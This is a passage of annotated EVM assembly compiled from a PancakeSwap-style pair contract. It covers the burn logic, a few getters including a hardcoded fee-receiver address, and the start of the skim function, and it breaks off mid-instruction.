dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7890:7946  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap5\n      swap7\n      pop\n      swap3\n      swap5\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      swap2\n      dup3\n      and\n      swap4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8038:8044  token1 */\n      swap2\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7971:7986  address _token0 */\n      0x00\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      dup5\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8110  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7989:7995  token0 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_228\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_228:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_229\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_229:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_230\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_230:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8185:8189  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8135:8148  uint balance1 */\n      0x00\n      swap2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8176  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8085:8125  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8176  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_231\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_231:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_232\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_232:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_233\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_233:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8236:8240  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8201:8215  uint liquidity */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8218:8242  balanceOf[address(this)] */\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8218:8227  balanceOf */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      0x20\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8218:8242  balanceOf[address(this)] */\n      mstore\n      0x40\n      dup2\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8151:8191  IERC20(_token1).balanceOf(address(this)) */\n      swap2\n      swap3\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8266:8296  _mintFee(_reserve0, _reserve1) */\n      tag_234\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8275:8284  _reserve0 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8286:8295  _reserve1 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8266:8274  _mintFee */\n      tag_204\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8266:8296  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_234:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8306:8323  uint _totalSupply */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8326:8337  totalSupply */\n      sload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8253:8296  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8326:8337  totalSupply */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8458  liquidity.mul(balance0) */\n      tag_235\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8444  liquidity */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8449:8457  balance0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8458  liquidity.mul(balance0) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8448  liquidity.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8458  liquidity.mul(balance0) */\n      and\n      jump\t// in\n    tag_235:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8435:8473  liquidity.mul(balance0) / _totalSupply */\n      dup2\n      tag_236\n      jumpi\n      invalid\n    tag_236:\n      div\n      swap11\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8567:8579  _totalSupply */\n      dup1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8564  liquidity.mul(balance1) */\n      tag_237\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8550  liquidity */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8555:8563  balance1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8564  liquidity.mul(balance1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8554  liquidity.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8564  liquidity.mul(balance1) */\n      and\n      jump\t// in\n    tag_237:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8541:8579  liquidity.mul(balance1) / _totalSupply */\n      dup2\n      tag_238\n      jumpi\n      invalid\n    tag_238:\n      div\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8531:8579  amount1 = liquidity.mul(balance1) / _totalSupply */\n      swap10\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8668:8669  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8665  amount0 */\n      dup12\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8669  amount0 > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8684  amount0 > 0 && amount1 > 0 */\n      dup1\n      iszero\n      tag_239\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8683:8684  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8673:8680  amount1 */\n      dup11\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8673:8684  amount1 > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8658:8684  amount0 > 0 && amount1 > 0 */\n    tag_239:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8637:8748  require(... */\n      tag_240\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x26\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6c050b0a8d3f2d18d11271ee0a551b7748437b8fa9a6165c561190d34a2947d6\n      0x26\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_240:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8758:8789  _burn(address(this), liquidity) */\n      tag_241\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8772:8776  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8779:8788  liquidity */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8758:8763  _burn */\n      tag_242\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8758:8789  _burn(address(this), liquidity) */\n      jump\t// in\n    tag_241:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8799:8834  _safeTransfer(_token0, to, amount0) */\n      tag_243\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8813:8820  _token0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8822:8824  to */\n      dup14\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8826:8833  amount0 */\n      dup14\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8799:8812  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8799:8834  _safeTransfer(_token0, to, amount0) */\n      jump\t// in\n    tag_243:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8844:8879  _safeTransfer(_token1, to, amount1) */\n      tag_244\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8858:8865  _token1 */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8867:8869  to */\n      dup14\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8871:8878  amount1 */\n      dup13\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8844:8857  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8844:8879  _safeTransfer(_token1, to, amount1) */\n      jump\t// in\n    tag_244:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8934:8938  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8925  IERC20(_token0).balanceOf */\n      dup10\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8925  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_245\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_245:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_246\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_246:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_247\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_247:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8995:8999  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap7\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:8986  IERC20(_token1).balanceOf */\n      dup9\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8900:8940  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:8986  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_248\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_248:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_249\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_249:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_250\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_250:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap4\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9012:9061  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_251\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9020:9028  balance0 */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":8961:9001  IERC20(_token1).balanceOf(address(this)) */\n      dup6\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9040:9049  _reserve0 */\n      dup12\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9051:9060  _reserve1 */\n      dup12\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9012:9019  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9012:9061  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_251:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9075:9080  feeOn */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9071:9118  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n      iszero\n      tag_252\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9109:9117  reserve1 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9118  uint(reserve0).mul(reserve1) */\n      tag_253\n      swap1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9095:9103  reserve0 */\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9109:9117  reserve1 */\n      swap1\n      div\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9118  uint(reserve0).mul(reserve1) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9108  uint(reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9090:9118  uint(reserve0).mul(reserve1) */\n      and\n      jump\t// in\n    tag_253:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9082:9087  kLast */\n      0x0e\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9082:9118  kLast = uint(reserve0).mul(reserve1) */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9071:9118  if (feeOn) kLast = uint(reserve0).mul(reserve1) */\n    tag_252:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9173:9211  Burn(msg.sender, amount0, amount1, to) */\n      0x40\n      dup1\n      mload\n      dup13\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup16\n      and\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9178:9188  msg.sender */\n      caller\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":9173:9211  Burn(msg.sender, amount0, amount1, to) */\n      0xdccd412f0b1252819cb1fd330b93224ca42612892bb3f4f789976e6d81936496\n      swap3\n      swap1\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n      log3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1357:1358  _ */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":7789:9218  function burn(... */\n      swap2\n      pop\n      swap2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":438:508  address public FeeResiver = 0x358bB1515A41a803aD950D3A0d22B914093DdB80 */\n    tag_96:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x06))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":262:302  string public constant symbol = \"KBC-LP\" */\n    tag_98:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x06\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xd4, 0x04b42432d4c5)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3005:3144  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_105:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3068:3072  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      tag_182\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3094:3104  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3106:3108  to */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3110:3115  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3093  _transfer */\n      tag_190\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3084:3116  _transfer(msg.sender, to, value) */\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":515:563  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_107:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":556:563  10 ** 3 */\n      0x03e8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":515:563  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17828:18249  function skim(address to) external lock {... */\n    tag_110:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1300  unlocked */\n      sload(0x0f)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1304:1305  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1292:1305  unlocked == 1 */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1284:1325  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_257\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_257:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1346:1347  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1343  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1335:1347  unlocked = 0 */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      sload(0x08)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17945:17951  token1 */\n      sload(0x09)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18085:18093  reserve0 */\n      sload(0x0b)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18074:18078  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      swap5\n      dup6\n      and\n      swap5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17945:17951  token1 */\n      swap1\n      swap4\n      and\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17976:18104  _safeTransfer(... */\n      tag_259\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      dup6\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18024:18026  to */\n      dup8\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18094  IERC20(_token0).balanceOf(address(this)).sub(reserve0) */\n      tag_260\n      swap3\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18085:18093  reserve0 */\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":17896:17902  token0 */\n      dup6\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18065  IERC20(_token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":18040:18080  IERC20(_token0).balanceOf(address(this)) 